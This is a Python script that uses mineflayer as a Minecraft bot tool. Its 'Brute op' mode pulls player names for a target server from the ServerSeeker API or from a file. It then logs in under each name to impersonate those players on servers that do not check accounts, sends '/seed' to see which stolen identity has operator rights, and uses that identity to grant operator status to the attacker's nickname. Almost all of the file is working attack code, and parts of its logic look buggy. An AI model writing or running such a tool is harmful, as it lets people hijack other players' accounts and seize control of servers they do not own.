import asyncio
import time

from javascript import require, On
import datetime, os, json, requests

mineflayer = require('mineflayer')
count = []
settings = json.load(open('settings.json', 'r'))
def printf(message):
    timestamp = datetime.datetime.now().strftime('%H:%M:%S')
    print(f'[{timestamp}] {message}')


def cls():
    os.system('cls' if os.name == 'nt' else 'clear')

async def Writer(bot):
    printf(f'Connected as {bot._client.username}')
    while True:
        message = input()
        if 'con' in message:
            bot.end()
            bot = mineflayer.createBot({
                'host': str(settings['server']).split(':')[0],
                'port': int(str(settings['server']).split(':')[1]),
                'username': message.split(' ')[1]
            })
            printf(f'Connected as {bot._client.username}')
        else:
            bot.chat(message)


def Bot(bot):
    @On(bot, 'chat')
    def messages(this, sender, message, *args):
        if '[' in message:
            printf(f'{bot._client.username} have op!')
        else:
            printf(f'<{sender}> {message}')
    asyncio.run(Writer(bot))

def sendmesage(bot, players):
    @On(bot, 'chat')
    def messages(this, sender, message, *args):
        if bot._client.username == players[-1]:
            if '[' in message:
                printf(f'{bot._client.username} have op!')
                for botname in clients:
                    if botname['username'] == bot._client.username:
                        if settings['auto_op']:
                            bot.chat(f'/op {settings["auto_op_nickname"]}')
                            printf(f'Oped {settings["auto_op_nickname"]}')
                        botname.end()
                        printf('Ended with checking!')
            else:
                printf(f'{bot._client.username} dont have op!')
                for botname in clients:
                    if botname['username'] == bot._client.username:

                        botname.end()
                        printf('Ended with checking!')
        else:
            if '[' in message:
                printf(f'{bot._client.username} have op!')
                for botname in clients:
                    if botname['username'] == bot._client.username:
                        if settings['auto_op']:
                            bot.chat(f'/op {settings["auto_op_nickname"]}')
                            printf(f'Oped {settings["auto_op_nickname"]}')
                        botname.end()
            else:
                printf(f'{bot._client.username} dont have op!')
                for botname in clients:
                    if botname['username'] == bot._client.username:
                        botname.end()

    @On(bot, 'spawn')
    def hande(*args):
        bot.chat('/seed')


if __name__ == '__main__':
    print('[1] Connect to server')
    print('[2] Brute op')
    choice = input()
    cls()
    if choice == str(1):
        bot = mineflayer.createBot({
            'host': str(settings['server']).split(':')[0],
            'port': int(str(settings['server']).split(':')[1]),
            'username': settings['nickname']
        })
        Bot(bot)
    elif choice == str(2):
        if settings['use_api'] == True:
            data = {
                'api_key': settings['api_key'],
                'ip': str(settings['server']).split(':')[0],
                'port': int(str(settings['server']).split(':')[1])
            }
            response = requests.post(
                'https://serverseeker.damcraft.de/api/v1/server_info', json=data)
            clients = []
            players = []
            for player in json.loads(response.text)['players']:
                players.append(player['name'])
            printf(players)
            for player in players:
                if player != 'Anonymous':
                    bot = mineflayer.createBot({
                        'host': str(settings['server']).split(':')[0],
                        'port': int(str(settings['server']).split(':')[1]),
                        'username': player
                    })
                    clients.append(bot)
                    sendmesage(bot, players)
        else:
            with open('players.txt','r') as f:
                players = f.readlines()
                players = list((player.replace('\n','').split(' ')[0] for player in players))
                print(players)
                clients = []
                for player in players:
                    if player != 'Anonymous':
                        bot = mineflayer.createBot({
                            'host': str(settings['server']).split(':')[0],
                            'port': int(str(settings['server']).split(':')[1]),
                            'username': player
                        })
                        clients.append(bot)
                        sendmesage(bot, players)
